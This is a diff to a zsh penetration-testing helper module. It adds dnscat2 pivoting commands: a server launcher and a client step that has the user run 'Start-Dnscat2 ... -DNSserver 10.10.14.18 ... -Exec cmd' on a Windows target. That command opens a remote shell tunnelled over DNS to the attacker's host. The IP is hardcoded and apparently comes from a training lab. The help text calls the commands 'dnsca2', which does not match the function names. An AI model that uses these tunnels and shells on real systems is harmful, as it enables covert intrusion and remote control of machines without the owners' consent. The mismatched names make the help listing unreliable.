@@ -22,11 +22,18 @@ nb-pivot-chisel                       # TODO
 nb-pivot-sshuttle                     ssh pivoting with sshuttle (without the need of proxychains)
 nb-pivot-rpivot-server                web server pivoting with rpivot server.py
 nb-pivot-rpivot-client                web server pivoting with rpivot client.py
+nb-pivot-dnsca2-server                start the dnscat2 server
+nb-pivot-dnsca2-client                command to establish a tunnel with the server running on our attack host
 
 Using SSH
 ---------
 nb-pivot-ssh-dynamic-proxy            forwards local port to remote port using ssh's dynamic socks4 proxy
 nb-pivot-ssh-reverse-proxy            forwards remote port to local port
+
+Branching Out Tunnels
+---------------------
+nb-pivot-dnsca2-server
+nb-pivot-dnsca2-client
 
 Commands
 --------
@@ -122,7 +129,7 @@ nb-pivot-rpivot-client() {
     __ask "Did you transfer the 'rpivot' to the target? (y/n)"
     local rp && __askvar rp "ANSWER"
 
-    if [[ $sh == "n" ]]; then
+    if [[ $rp == "n" ]]; then
       __err "Transfer 'rpivot' to target before proceeding."
       __info "Use nb-srv-scp-up (use scp -r)"
       exit 1
@@ -136,4 +143,30 @@ nb-pivot-rpivot-client() {
     __ok "echo 'socks4 	127.0.0.1 ${__LPORT}' | sudo tee -a /etc/proxychains4.conf"
     echo
     __info "Use proxychains to access teh web server: 'proxychains firefox <target_ip>:80'"
+}
+
+nb-pivot-dnscat2-server() {
+    nb-vars-set-lhost
+    nb-vars-set-domain
+    print -z "sudo ruby dnscat2.rb --dns host=${__LHOST},port=53,domain=${__DOMAIN} --no-cache"
+    __info "Copy the secret key, will be needed for dnscat2 client on Windows host for tunnel encryption"
+}
+
+nb-pivot-dnscat2-client() {
+    nb-vars-set-lhost
+
+    __ask "Did you transfer the 'dnscat2.ps1' to the target? (y/n)"
+    local dn && __askvar dn "ANSWER"
+
+    if [[ $dn == "n" ]]; then
+      __err "Transfer 'dnscat2.ps1' to target before proceeding."
+      exit 1
+    fi
+
+    __ask "Enter the secret key generated from dnscat-server command"
+    local key && __askvar key "SECRET_KEY"
+
+    __info "Run the following commands on the target (powershell):"
+    __ok "Import-Module .\\dnscat2.ps1"
+    __ok "Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret $key -Exec cmd"
 }
